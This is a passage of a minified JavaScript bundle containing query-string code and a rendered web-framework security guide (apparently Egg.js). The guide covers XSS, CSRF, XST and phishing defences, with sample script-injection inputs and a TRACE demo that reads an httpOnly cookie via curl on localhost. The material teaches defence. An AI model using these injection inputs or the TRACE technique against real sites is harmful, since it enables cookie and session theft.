p;if(null!==e.encoder&&"undefined"!==typeof e.encoder&&"function"!==typeof e.encoder)throw new TypeError("Encoder has to be a function.");var t=e.charset||p.charset;if("undefined"!==typeof e.charset&&"utf-8"!==e.charset&&"iso-8859-1"!==e.charset)throw new TypeError("The charset option must be either utf-8, iso-8859-1, or undefined");var n=l["default"];if("undefined"!==typeof e.format){if(!o.call(l.formatters,e.format))throw new TypeError("Unknown format option provided.");n=e.format}var a=l.formatters[n],r=p.filter;return("function"===typeof e.filter||c(e.filter))&&(r=e.filter),{addQueryPrefix:"boolean"===typeof e.addQueryPrefix?e.addQueryPrefix:p.addQueryPrefix,allowDots:"undefined"===typeof e.allowDots?p.allowDots:!!e.allowDots,charset:t,charsetSentinel:"boolean"===typeof e.charsetSentinel?e.charsetSentinel:p.charsetSentinel,delimiter:"undefined"===typeof e.delimiter?p.delimiter:e.delimiter,encode:"boolean"===typeof e.encode?e.encode:p.encode,encoder:"function"===typeof e.encoder?e.encoder:p.encoder,encodeValuesOnly:"boolean"===typeof e.encodeValuesOnly?e.encodeValuesOnly:p.encodeValuesOnly,filter:r,format:n,formatter:a,serializeDate:"function"===typeof e.serializeDate?e.serializeDate:p.serializeDate,skipNulls:"boolean"===typeof e.skipNulls?e.skipNulls:p.skipNulls,sort:"function"===typeof e.sort?e.sort:null,strictNullHandling:"boolean"===typeof e.strictNullHandling?e.strictNullHandling:p.strictNullHandling}};e.exports=function(e,t){var n,r,l=e,o=E(t);"function"===typeof o.filter?(r=o.filter,l=r("",l)):c(o.filter)&&(r=o.filter,n=r);var s,d=[];if("object"!==typeof l||null===l)return"";s=t&&t.arrayFormat in i?t.arrayFormat:t&&"indices"in t?t.indices?"indices":"repeat":"indices";var m=i[s];if(t&&"commaRoundTrip"in t&&"boolean"!==typeof t.commaRoundTrip)throw new TypeError("`commaRoundTrip` must be a boolean, or absent");var p="comma"===m&&t&&t.commaRoundTrip;n||(n=Object.keys(l)),o.sort&&n.sort(o.sort);for(var h=a(),g=0;g<n.length;++g){var b=n[g];o.skipNulls&&null===l[b]||u(d,f(l[b],b,m,p,o.strictNullHandling,o.skipNulls,o.encode?o.encoder:null,o.filter,o.sort,o.allowDots,o.serializeDate,o.format,o.formatter,o.encodeValuesOnly,o.charset,h))}var v=d.join(o.delimiter),y=!0===o.addQueryPrefix?"?":"";return o.charsetSentinel&&("iso-8859-1"===o.charset?y+="utf8=%26%2310003%3B&":y+="utf8=%E2%9C%93&"),v.length>0?y+v:""}},EX3u:function(e,t,n){var a=n("u9el");a("Int32",(function(e){return function(t,n,a){return e(this,t,n,a)}}))},EXoo:function(e,t,n){var a=n("u9el");a("Uint8",(function(e){return function(t,n,a){return e(this,t,n,a)}}),!0)},EYzw:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"concept-of-web-security"},r.a.createElement(l["AnchorLink"],{to:"#concept-of-web-security","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Concept of Web Security"),r.a.createElement("p",null,"There are a lot of security risks in Web applications, the risk will be used by hackers, while distort Web page content, or steal website internal data, further more, malicious code maybe embedded in the Web page, make users be weak. Common security vulnerabilities are as follows:"),r.a.createElement("ul",null,r.a.createElement("li",null,"XSS attack: inject scripts into Web pages, use JavaScript to steal user information, then induce user actions."),r.a.createElement("li",null,"CSRF attack: forgery user requests to launch malicious requests to the site."),r.a.createElement("li",null,"phishing attacks: use the site's links or images to create phishing traps."),r.a.createElement("li",null,"http parameter pollution: by using imperfect validation of parameter format, the server will be injected with parameters."),r.a.createElement("li",null,"remote code execution: users could implement command through browser, due to the server did not perform function against doing filtering, lead to malicious code execution.")),r.a.createElement("p",null,"The framework itself has a rich solution for common security risks on the Web side:"),r.a.createElement("ul",null,r.a.createElement("li",null,"use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/docs/source/zh-cn/basics/extend.md"},"extend")," mechanism to extend Helper API, various template filtering functions are provided to prevent phishing or XSS attacks."),r.a.createElement("li",null,"Support of common Web security headers."),r.a.createElement("li",null,"CSRF defense."),r.a.createElement("li",null,"flexible security configuration that matches different request urls."),r.a.createElement("li",null,"customizable white list for safe redirect and url filtering."),r.a.createElement("li",null,"all kinds of template related tools for preprocessing.")),r.a.createElement("p",null,"Security plugins ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security"},"egg-security")," are built into the framework, provides default security practices."),r.a.createElement("h3",{id:"open-or-close-the-configuration"},r.a.createElement(l["AnchorLink"],{to:"#open-or-close-the-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Open or Close the Configuration"),r.a.createElement("p",null,"Note: it is not recommended to turn off the functions provided by the security plugins unless the consequences are clearly confirmed."),r.a.createElement("p",null,"The security plugin for the framework opens by default, if we want to close some security protection, directly set the ",r.a.createElement("code",null,"enable")," attribute to false. For example, close xframe precautions:"),r.a.createElement(o["a"],{code:"exports.security = {\n  xframe: {\n    enable: false,\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"match-and-ignore"},r.a.createElement(l["AnchorLink"],{to:"#match-and-ignore","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"match")," and ",r.a.createElement("code",null,"ignore")),r.a.createElement("p",null,"Match and ignore methods and formats are the same with",r.a.createElement(l["AnchorLink"],{to:"../basics/middleware#match%20and%20ignore"},"middleware general configuration"),"."),r.a.createElement("p",null,"If you want to set security config open for a certain path, you can configure ",r.a.createElement("code",null,"match")," option."),r.a.createElement("p",null,"For example, just open csp when path contains ",r.a.createElement("code",null,"/example"),", you can configure with the following configuration:"),r.a.createElement(o["a"],{code:"exports.security = {\n  csp: {\n    match: '/example',\n    policy: {\n      //...\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,"If you want to set security config disable for a certain path, you can configure match option."),r.a.createElement("p",null,"For example, just disable xframe when path contains ",r.a.createElement("code",null,"/example")," while our pages can be embedded in cooperative businesses , you can configure with the following configuration:"),r.a.createElement(o["a"],{code:"exports.security = {\n  csp: {\n    ignore: '/example',\n    xframe: {\n      //...\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,"If you want to close some security protection against internal IP:"),r.a.createElement(o["a"],{code:'exports.security = {\n  csrf: {\n    // To determine whether to ignore the method, request context "context" as the first parameter\n    ignore: (ctx) => isInnerIp(ctx.ip),\n  },\n};',lang:"js"}),r.a.createElement("p",null,"We'll look at specific scenarios to illustrate how to use the security scenarios provided by the framework for Web security precautions."),r.a.createElement("h2",{id:"prevention-of-security-threat-xss"},r.a.createElement(l["AnchorLink"],{to:"#prevention-of-security-threat-xss","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention of Security Threat ",r.a.createElement("code",null,"XSS")),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"},"XSS"),'\uff08cross-site scripting\uff09is the most common Web attack, which focus on "cross-domain" and "client-side execution."'),r.a.createElement("p",null,"XSS attacks generally fall into two categories:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Reflected XSS"),r.a.createElement("li",null,"Stored XSS")),r.a.createElement("h3",{id:"reflected-xss"},r.a.createElement(l["AnchorLink"],{to:"#reflected-xss","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Reflected XSS"),r.a.createElement("p",null,"Reflective XSS attacks, mainly because the server receives insecure input from the client, triggers the execution of a Web attack on the client side. Such as:"),r.a.createElement("p",null,"Search for items on a shopping site, and results will display search keywords. Now you fill in the search keywords ",r.a.createElement("code",null,"<script>alert('handsome boy')<\/script>"),", then click search. If page does not filter the keywords, this code will be executed directly on the page, pop-up alert."),r.a.createElement("h4",{id:"prevention"},r.a.createElement(l["AnchorLink"],{to:"#prevention","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention"),r.a.createElement("p",null,"Framework provides ",r.a.createElement("code",null,"helper.escape()")," method to do string XSS filter."),r.a.createElement(o["a"],{code:"const str = '><script>alert(\"abc\") <\/script><';\nconsole.log(ctx.helper.escape(str));\n// => &gt;&lt;script&gt;alert(&quot;abc&quot;) &lt;/script&gt;&lt;",lang:"js"}),r.a.createElement("p",null,"When the site need to output the result of user input directly, be sure to use ",r.a.createElement("code",null,"helper.escape()")," wrapped. Such as in ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks")," will overwrite the built-in ",r.a.createElement("code",null,"escape")),r.a.createElement("p",null,"In another case, the output of server's interface will be provided to JavaScript to use. This time you need to use ",r.a.createElement("code",null,"helper.sjs()")," for filtering."),r.a.createElement("p",null,r.a.createElement("code",null,"helper.sjs()")," is used to output variables in JavaScript (including events such as onload), and do JavaScript ENCODE for characters in variables. All characters will be escaped to ",r.a.createElement("code",null,"\\x")," if there are not in whitelist, to prevent XSS attacks, also ensure the correctness of the output in JavaScript."),r.a.createElement(o["a"],{code:'const foo = \'"hello"\';\n\n// not use sjs\nconsole.log(`var foo = "${foo}";`);\n// => var foo = ""hello"";\n\n// use sjs\nconsole.log(`var foo = "${this.helper.sjs(foo)}";`);\n// => var foo = "\\\\x22hello\\\\x22";',lang:"js"}),r.a.createElement("p",null,"There is also a case that sometimes we need to output json in JavaScript, which is easily exploited as a XSS vulnerability if it is not escaped. Framework provides ",r.a.createElement("code",null,"helper.sjson()")," macro to do json encode, it will traverse the key in a json, all the character in the key's value will be escaped to ",r.a.createElement("code",null,"\\x")," if there are not in whitelist, to prevent XSS attacks, while keep the json structure unchanged. If you need to output a JSON string for use in JavaScript, please use ",r.a.createElement("code",null,"helper.sjson(variable name)")," to escape."),r.a.createElement("p",null,r.a.createElement("strong",null,"The processing process is more complicated, the performance loss is larger, please use only if necessary")),r.a.createElement("p",null,"Example:"),r.a.createElement(o["a"],{code:"<script>\n  window.locals = {{ helper.sjson(locals) }};\n<\/script>",lang:"html"}),r.a.createElement("h3",{id:"stored-xss"},r.a.createElement(l["AnchorLink"],{to:"#stored-xss","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Stored XSS"),r.a.createElement("p",null,"Stored XSS attacks are stored on the server by submitting content with malicious scripts that will be launched when others see the content. The content is typically edited through some rich text editors, and it is easy to insert dangerous code."),r.a.createElement("h4",{id:"prevention-1"},r.a.createElement(l["AnchorLink"],{to:"#prevention-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention"),r.a.createElement("p",null,"Framework provides ",r.a.createElement("code",null,"helper.shtml()")," to do XSS filtering."),r.a.createElement("p",null,"Note that you need to use SHTML to handle the rich text (which contains the text of the HTML code) as a variable directly in the template. Use SHTML to output HTML tags, while executing XSS filtering, then it can filter out illegal scripts."),r.a.createElement("p",null,r.a.createElement("strong",null,"The processing process is more complicated, the performance loss is larger, please use only if you need to output html content")),r.a.createElement("p",null,"Example\uff1a"),r.a.createElement(o["a"],{code:'// js\nconst value = `<a href="http://www.domain.com">google</a><script>evilcode\u2026<\/script>`;',lang:"js"}),r.a.createElement(o["a"],{code:'// template\n<html>\n  <body>\n    {{ helper.shtml(value) }}\n  </body>\n</html>\n// =>\n<a href="http://www.domain.com">google</a>&lt;script&gt;evilcode\u2026&lt;/script&gt;',lang:"html"}),r.a.createElement("p",null,"Shtml based on ",r.a.createElement(l["Link"],{to:"https://github.com/leizongmin/js-xss/"},"xss")," , and add filters by domain name."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/leizongmin/js-xss/blob/master/lib/default.js"},"defaule rule")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"http://jsxss.com/zh/options.html"},"custom rule"))),r.a.createElement("p",null,"For example, only support ",r.a.createElement("code",null,"a")," label, and all other properties except ",r.a.createElement("code",null,"title")," are filtered: ",r.a.createElement("code",null,"whiteList: ","{","a: ['title']","}")),r.a.createElement("p",null,"options:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"config.helper.shtml.domainWhiteList: []"),' extend whilelist used by "href" and "src"')),r.a.createElement("p",null,"Note shtml uses a strict whitelisting mechanism, not only filter out the XSS risk strings, all tags or attrs outside [the default rules] (",r.a.createElement(l["Link"],{to:"https://github.com/leizongmin/js-xss/blob/master/lib/default.js"},"https://github.com/leizongmin/js-xss/blob/master/lib/default.js"),") will be filtered out."),r.a.createElement("p",null,"For example, tag ",r.a.createElement("code",null,"HTML")," is not in the whitelist."),r.a.createElement(o["a"],{code:"const html = '<html></html>';\n\n// html\n{\n  {\n    helper.shtml(html);\n  }\n}\n// empty output",lang:"js"}),r.a.createElement("p",null,"Due to not in the whitelist, common properties like ",r.a.createElement("code",null,"data-xx")," will be filtered."),r.a.createElement("p",null,"So, it is important to pay attention to the use of shtml, which is generally aimed at the rich text input from users, please avoid abuse, which can be restricted and affect the performance of the service."),r.a.createElement("p",null,"Such scenarios are generally like BBS, comment system, etc., even if does not support HTML content such as BBS input, do not use this Helper, direct use ",r.a.createElement("code",null,"escape")," instead."),r.a.createElement("h3",{id:"jsonp-xss"},r.a.createElement(l["AnchorLink"],{to:"#jsonp-xss","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"JSONP XSS"),r.a.createElement("p",null,'JSONP\'s "callback" parameter is very dangerous, it has two kinds of risks that might lead to XSS'),r.a.createElement("ol",null,r.a.createElement("li",null,"Callback parameter will truncate js code, the special characters like single quotation, double quotation or line breaks, both are at risk.")),r.a.createElement("p",null,"2\u3001Callback parameter add tag maliciously(such as ",r.a.createElement("code",null,"<script>"),"), cause XSS risk."),r.a.createElement("p",null,"Refer to ",r.a.createElement(l["Link"],{to:"http://blog.knownsec.com/2015/03/jsonp_security_technic/"},"JSONP security technic")),r.a.createElement("p",null,"Within the framework, the ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/jsonp-body"},"jsonp-body")," is used to make jsonp requests safe."),r.a.createElement("p",null,"Defense content:"),r.a.createElement("ul",null,r.a.createElement("li",null,"maximum 50 character limit for the name of callback function"),r.a.createElement("li",null,"callback function name only allow ",r.a.createElement("code",null,"["),", ",r.a.createElement("code",null,"]"),", ",r.a.createElement("code",null,"a-zA-Z0123456789_"),", ",r.a.createElement("code",null,"$"),", ",r.a.createElement("code",null,".")," to prevent XSS or utf-7 XSS attacks, etc.")),r.a.createElement("p",null,"Configration:"),r.a.createElement("ul",null,r.a.createElement("li",null,"callback - default is ",r.a.createElement("code",null,"_callback"),", you can rename"),r.a.createElement("li",null,"limit - callback function name length limit, default is 50.")),r.a.createElement("h3",{id:"other-xss-precautions"},r.a.createElement(l["AnchorLink"],{to:"#other-xss-precautions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Other XSS Precautions"),r.a.createElement("p",null,"Browser itself has some protection against all kinds of attacks, they generally take effect by opening the Web security headers. The framework has built-in support for some common Web security headers."),r.a.createElement("h4",{id:"csp"},r.a.createElement(l["AnchorLink"],{to:"#csp","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"CSP"),r.a.createElement("p",null,"CSP is short for Content Security Policy, It is mainly used to define which resources the page can load and reduce the occurrence of XSS."),r.a.createElement("p",null,"The framework supports the CSP configuration, but is closed by default, which can effectively prevent XSS attacks from happening. To configure the CSP, you need to know the policy strategy of CSP first, the details you can refer to [what CSP] (",r.a.createElement(l["Link"],{to:"https://www.zhihu.com/question/21979782"},"https://www.zhihu.com/question/21979782"),")."),r.a.createElement("h4",{id:"x-download-optionsnoopen"},r.a.createElement(l["AnchorLink"],{to:"#x-download-optionsnoopen","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"X-Download-Options:noopen"),r.a.createElement("p",null,'Opened by default, introduced in IE8 to control visibility of the "Open" button on the file download dialog.'),r.a.createElement("p",null,"Refer to ",r.a.createElement(l["Link"],{to:"http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx"},"http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx")),r.a.createElement("h4",{id:"x-content-type-optionsnosniff"},r.a.createElement(l["AnchorLink"],{to:"#x-content-type-optionsnosniff","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"X-Content-Type-Options:nosniff"),r.a.createElement("p",null,"Disable IE8 automatically sniffer such as ",r.a.createElement("code",null,"text/plain")," rendered by ",r.a.createElement("code",null,"text/HTML")," , especially when the content of this site is not credible."),r.a.createElement("h4",{id:"x-xss-protection"},r.a.createElement(l["AnchorLink"],{to:"#x-xss-protection","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"X-XSS-Protection"),r.a.createElement("p",null,"Some XSS detection and precautions provided by Internet explorer, enabled by default"),r.a.createElement("ul",null,r.a.createElement("li",null,"close default is false\uff0cequal to ",r.a.createElement("code",null,"1; mode=block"))),r.a.createElement("h2",{id:"prevention-of-security-threat-csrf"},r.a.createElement(l["AnchorLink"],{to:"#prevention-of-security-threat-csrf","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention of Security Threat ",r.a.createElement("code",null,"CSRF")),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/CSRF"},"CSRF or XSRF")," is short for Cross-site request forgery, also called ",r.a.createElement("code",null,"One Click Attack")," or ",r.a.createElement("code",null,"Session Riding"),", is a malicious use of the site."),r.a.createElement("p",null,"CSRF attack will launch a malicious fake request for the site, which seriously affects the security of the site. Therefore, the framework has a built-in CSRF preparedness plan."),r.a.createElement("h3",{id:"prevention-2"},r.a.createElement(l["AnchorLink"],{to:"#prevention-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention"),r.a.createElement("p",null,"In general, there are some common ",r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet#CSRF_Specific_Defense"},"precautions")," for CSRF attacks. Briefly introduce several common precautions:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"Synchronizer Tokens\uff1aWhen the response page is rendered, token is rendered in the page, which will be submitted through a hidden input when a form is submitted.")),r.a.createElement("li",null,r.a.createElement("p",null,"Double Cookie Defense\uff1aThe token will be stored in client Cookie, Cookie will be submitted when you submit a POST/PUT/PATCH/DELETE request, then you can get the token, and submit the token through header or body, service side will compare and check it.")),r.a.createElement("li",null,r.a.createElement("p",null,"Custom Header\uff1aTrust request with specific header\uff08like ",r.a.createElement("code",null,"X-Requested-With: XMLHttpRequest"),"\uff09. This can be bypassed, so frameworks like rails and django ",r.a.createElement(l["Link"],{to:"https://www.djangoproject.com/weblog/2011/feb/08/security/"},"give up the guard"),"."))),r.a.createElement("p",null,"The framework combines these precautions to provide a configurable CSRF prevention strategy."),r.a.createElement("h4",{id:"usage"},r.a.createElement(l["AnchorLink"],{to:"#usage","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Usage"),r.a.createElement("h5",{id:"submit-form-with-csrf"},r.a.createElement(l["AnchorLink"],{to:"#submit-form-with-csrf","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Submit Form with CSRF"),r.a.createElement("p",null,"In synchronous rendering the page, you should add a parameter name called ",r.a.createElement("code",null,"_csrf")," in the form's submit url, the value is ",r.a.createElement("code",null,"ctx.csrf"),", when user submitting this form , CSRF token will be submitted:"),r.a.createElement(o["a"],{code:'<form\n  method="POST"\n  action="/upload?_csrf={{ ctx.csrf | safe }}"\n  enctype="multipart/form-data"\n>\n  title: <input name="title" /> file: <input name="file" type="file" />\n  <button type="submit">upload</button>\n</form>',lang:"html"}),r.a.createElement("p",null,"Fields that pass the CSRF token can be changed in the configuration:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  security: {\n    csrf: {\n      queryName: '_csrf', // CSRF token parameter name passed through query, default is _csrf\n      bodyName: '_csrf', // CSRF token parameter name passed through body, default is _csrf\n    },\n  },\n};",lang:"js"}),r.a.createElement("p",null,"In order to prevent the ",r.a.createElement(l["Link"],{to:"http://breachattack.com/"},"BREACH attack"),", CSRF token rendered on the page will be changed everytime request changed, and the view plugin, such as ",r.a.createElement("code",null,"egg-view-nunjucks"),", will automatically inject the hidden field in Form without any perception of the application developer."),r.a.createElement("h5",{id:"ajax-request"},r.a.createElement(l["AnchorLink"],{to:"#ajax-request","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"AJAX Request"),r.a.createElement("p",null,"In the default configuration, the token is set in the Cookie, which can be fetched from the Cookie and sent to the server through query, body, or header when an AJAX request is requested."),r.a.createElement("p",null,"In jQuery:"),r.a.createElement(o["a"],{code:"var csrftoken = Cookies.get('csrfToken');\n\nfunction csrfSafeMethod(method) {\n  // these HTTP methods do not require CSRF protection\n  return /^(GET|HEAD|OPTIONS|TRACE)$/.test(method);\n}\n$.ajaxSetup({\n  beforeSend: function (xhr, settings) {\n    if (!csrfSafeMethod(settings.type) && !this.crossDomain) {\n      xhr.setRequestHeader('x-csrf-token', csrftoken);\n    }\n  },\n});",lang:"js"}),r.a.createElement("p",null,"The fields that pass the CSRF token through the header can also be changed in the configuration:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  security: {\n    csrf: {\n      headerName: 'x-csrf-token', // CSRF token passed through header, default is x-csrf-token\n    },\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"session-vs-cookie-store"},r.a.createElement(l["AnchorLink"],{to:"#session-vs-cookie-store","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Session vs Cookie Store"),r.a.createElement("p",null,"By default, the framework will present the CSRF token in a Cookie to facilitate AJAX requests. But all subdomains can set cookies, so when our application cannot controll all subdomains, there may be a risk of CSRF attack stored in the Cookie. The framework provides a configuration that token can be stored in the Session."),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  security: {\n    csrf: {\n      useSession: true, // default is false\uff0cif set to true , it will store csrf token in Session\n      cookieName: 'csrfToken', // Field in Cookie , default is csrfToken\n      sessionName: 'csrfToken', // Filed in Session , default is csrfToken\n    },\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"ignore-json-requestdeprecated"},r.a.createElement(l["AnchorLink"],{to:"#ignore-json-requestdeprecated","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Ignore JSON Request(deprecated)"),r.a.createElement("p",null,r.a.createElement("strong",null,"Notice: this configure is deprecated, the attacker can bypass it through ",r.a.createElement(l["Link"],{to:"https://www.geekboy.ninja/blog/exploiting-json-cross-site-request-forgery-csrf-using-flash/"},"flash and 307"),", please don't enable it in production environment!")),r.a.createElement("p",null,"With security policy protection ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/Same-origin_policy"},"SOP"),", basically all modern browsers do not allow cross domain request when content-type is set to JSON, so we can just leave out JSON request."),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  security: {\n    csrf: {\n      ignoreJSON: true, // default is false\uff0cif set to be true ,it will leave out all request which content-type is `application/json`\n    },\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"refresh-csrf-token"},r.a.createElement(l["AnchorLink"],{to:"#refresh-csrf-token","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Refresh CSRF token"),r.a.createElement("p",null,"As CSRF token is stored in Cookie, once the user switches in the same browser, a new login user will still use the old token (old user used) before, this will bring certain security risks, so everytime user do login, website must refresh ",r.a.createElement("strong",null,"CSRF token"),"."),r.a.createElement(o["a"],{code:"// login controller\nexports.login = async function (ctx) {\n  const { username, password } = ctx.request.body;\n  const user = await ctx.service.user.find({ username, password });\n  if (!user) ctx.throw(403);\n  ctx.session = { user };\n\n  // call rotateCsrfSecret to refresh CSRF token\n  ctx.rotateCsrfSecret();\n\n  ctx.body = { success: true };\n};",lang:"js"}),r.a.createElement("h2",{id:"prevention-of-security-threat-xst"},r.a.createElement(l["AnchorLink"],{to:"#prevention-of-security-threat-xst","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention of Security Threat ",r.a.createElement("code",null,"XST")),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.owasp.org/index.php/XST"},"XST")," is short for ",r.a.createElement("code",null,"Cross-Site Tracing"),", client send TRACE request to server, if the server implement TRACE responding by standard, the complete header information of the request will be returned in response body. This way, client can get some sensitive header fields, such as httpOnly cookies."),r.a.createElement("p",null,"Below, we implement a simple TRACE support server based on Koa:"),r.a.createElement(o["a"],{code:"var koa = require('koa');\nvar app = koa();\n\napp.use(async function (ctx, next) {\n  ctx.cookies.set('a', 1, { httpOnly: true });\n  if (ctx.method === 'TRACE') {\n    var body = '';\n    for (header in ctx.headers) {\n      body += header + ': ' + ctx.headers[header] + '\\r\\n';\n    }\n    ctx.body = body;\n  }\n  await next;\n});\n\napp.listen(7001);",lang:"js"}),r.a.createElement("p",null,"You can send a GET request first ",r.a.createElement("code",null,"curl -i http://127.0.0.1:7001")," when service started, you will get response below:"),r.a.createElement(o["a"],{code:"HTTP/1.1 200 OK\nX-Powered-By: koa\nSet-Cookie: a=1; path=/; httponly\nContent-Type: text/plain; charset=utf-8\nContent-Length: 2\nDate: Thu, 06 Nov 2014 05:04:42 GMT\nConnection: keep-alive\n\nOK",lang:"unknown"}),r.a.createElement("p",null,"Then server sets an httpOnly Cookie ",r.a.createElement("code",null,"a")," to 1, it is not possible to get it through the script in the browser environment."),r.a.createElement("p",null,"Then we send a TRACE method request to the server with Cookie ",r.a.createElement("code",null,"curl -X TRACE -b a=1 -i http://127.0.0.1:7001"),", and will get response below:"),r.a.createElement(o["a"],{code:"HTTP/1.1 200 OK\n  X-Powered-By: koa\n  Set-Cookie: a=1; path=/; httponly\n  Content-Type: text/plain; charset=utf-8\n  Content-Length: 73\n  Date: Thu, 06 Nov 2014 05:07:47 GMT\n  Connection: keep-alive\n\n  user-agent: curl/7.37.1\n  host: 127.0.0.1:7001\n  accept: */*\n  cookie: a=1",lang:"unknown"}),r.a.createElement("p",null,"The complete header information can be seen in the response body, so that we bypass the httpOnly limit and get the cookie a= 1, causing a great risk."),r.a.createElement("h3",{id:"more"},r.a.createElement(l["AnchorLink"],{to:"#more","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"More"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html"},"http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html")),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/"},"http://deadliestwebattacks.com/2010/05/18/cross-site-tracing-xst-the-misunderstood-vulnerability/")),r.a.createElement("h3",{id:"prevention-3"},r.a.createElement(l["AnchorLink"],{to:"#prevention-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention"),r.a.createElement("p",null,"The framework has banned three types of dangerous request type: trace, track, options."),r.a.createElement("h2",{id:"prevention-of-security-threats-phishing-attacks"},r.a.createElement(l["AnchorLink"],{to:"#prevention-of-security-threats-phishing-attacks","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention of Security threats ",r.a.createElement("code",null,"phishing attacks")),r.a.createElement("p",null,"There are many ways to Phishing, here will introduce url Phishing, photo Phishing and iframe Phishing."),r.a.createElement("h3",{id:"url-phishing"},r.a.createElement(l["AnchorLink"],{to:"#url-phishing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"URL Phishing"),r.a.createElement("p",null,"The server side does not check and control the incoming redirect url variable, which can lead to malicious construction of any malicious address, then can induce users to redirect to malicious websites."),r.a.createElement("p",null,"Due to redirect from a trusted site, users will be more trust, so redirect risk is commonly used in phishing attacks, by going to a malicious web site and cheat users enter the user name and password to steal user information, make money trading or deceive users;"),r.a.createElement("p",null,"It may also cause XSS attact (mainly use 302 redirect often, set HTTP response headers: ",r.a.createElement("code",null,"Location: url"),", if the url contains a CRLF, it could partition the HTTP response headers, make the back part falls to HTTP body, leading to XSS)."),r.a.createElement("h3",{id:"prevention-4"},r.a.createElement(l["AnchorLink"],{to:"#prevention-4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prevention"),r.a.createElement("ul",null,r.a.createElement("li",null,"If the redirect url can be determined in advance, including the value of the url and parameters, you can configured in the background first. If do redirect, directly preach corresponding index of url, and find corresponding specific url then redirect through index;"),r.a.createElement("li",null,"If the redirect url is not previously determined, but it is generated by server background (not passing by user's parameter), you can make a redirect link, then sign it;"),r.a.createElement("li",null,"if 1 and 2 are not satisfied, url could not determine beforehand and only pass through the front end of the incoming parameters, url must be validated before redirect, to judge whether it within the application authorization whitelist.")),r.a.createElement("p",null,"The framework provides a safe redirect method to avoid this risk by configuring a whitelist."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.redirect(url)")," If redirect url is not in the whitelist of configuration, it is 